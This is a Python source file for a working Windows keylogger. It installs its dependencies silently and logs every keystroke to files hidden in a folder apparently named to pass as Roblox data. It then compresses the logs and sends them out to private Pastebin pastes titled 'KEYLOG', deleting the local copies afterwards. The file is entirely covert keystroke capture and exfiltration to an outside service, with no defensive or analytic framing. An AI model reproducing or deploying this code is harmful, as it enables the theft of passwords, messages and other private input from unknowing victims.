import os,time,sys,getpass,shutil,random,zlib
 
try:
    import requests
except ImportError:
    os.system("C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pip.exe install requests -q")

usrhome = "C:/Users/"+getpass.getuser()
roamingappdata = "C:/Users/"+getpass.getuser()+"/AppData/Roaming"
localappdata = "C:/Users/"+getpass.getuser()+"/AppData/Local"
cpath = roamingappdata+"/.rbx/roblox"

if os.path.exists(cpath+"/PBIN_CREDS.bin"):
    with open(cpath+"/PBIN_CREDS.bin","r") as creds:
        exec(creds.read())

try:
    from pynput.keyboard import Key, Listener
    from datetime import datetime
except ImportError:
    os.system("C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pip.exe install pynput -q")
    os.system("C:\\Users\\"+getpass.getuser()+"\\AppData\\Local\\Programs\\Python\\Python312\\Scripts\\pip.exe install datetime -q")
 
if os.path.exists(cpath+"/download/data-current.bin") and os.path.exists(cpath+"/PBIN_CREDS.bin"):
    i,string = 0,""
    while os.path.exists(cpath+"/download/asset"+str(i)+".bin"):
        string += open(cpath+"/download/asset"+str(i)+".bin").read().replace("\n","")
        i += 1
    string += open(cpath+"/download/data-current.bin","r").read().replace("\n","")
 
    string = str(eval("zlib.compress(b'"+string+"')"))
 
    text = string
    t_title = "KEYLOG ["+datetime.now().strftime("%m/%d/%Y @ %I:%M:%S %p")+" | id: "+devid+"]"
    login_data = {
        'api_dev_key': key,
        'api_user_name': username,
        'api_user_password': password
    }
    data = {
        'api_option': 'paste',
        'api_dev_key':key,
        'api_paste_code':text,
        'api_paste_name':t_title,
        'api_paste_expire_date': 'N',
        'api_user_key': None,
        'api_paste_private': '2'
    }
 
    login = requests.post("https://pastebin.com/api/api_login.php", data=login_data)
    data['api_user_key'] = login.text
    r = requests.post("https://pastebin.com/api/api_post.php", data=data)
    if os.path.exists(cpath+"/download") and r.status_code == 200:
        shutil.rmtree(cpath+"/download")
 
if not os.path.exists(cpath+"/.."):
    os.mkdir(cpath+"/..")
    
if not os.path.exists(cpath):
    os.mkdir(cpath)
 
if not os.path.exists(cpath+"/download"):
    os.mkdir(cpath+"/download")
 
if not os.path.exists(cpath+"/PBIN_CREDS.bin"):
    pass_keys = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z",
"1","2","3","4","5","6","7","8","9","0"]
    i,devid = 0,""
    while i < 7:
        devid += pass_keys[random.randint(1,len(pass_keys))]
        i += 1
    with open(cpath+"/PBIN_CREDS.bin","w") as creds:
        creds.write("key = 'YOUR_KEY_FROM_https://pastebin.com/doc_api'\nusername = 'YOUR_PASTEBIN_USERNAME'\npassword = 'YOUR_PASTEBIN_PASSWORD'\ndevid = '"+devid+"'")
        creds.close()
 
def on_press(key):
    raw = open(cpath+"/download/data-current.bin","a")
    if "Key." in str(key):
        raw.write(str(key).replace("Key."," ")+" \n")
    else:
        raw.write(str(key).replace("'","")+"\n")
    raw.close()
 
    if len(open(cpath+"/download/data-current.bin","r").read().split("\n")) >= 1001:
        i = 0
        while os.path.exists(cpath+"/download/asset"+str(i)+".bin"):
            i += 1
        shutil.copy(cpath+"/download/data-current.bin", cpath+"/download/asset"+str(i)+".bin")
        with open(cpath+"/download/data-current.bin","w") as temp:
            temp.write("")
            temp.close()
 
with Listener(on_press=on_press) as listener:
    listener.join()
 
while True:
    time.sleep(0.05)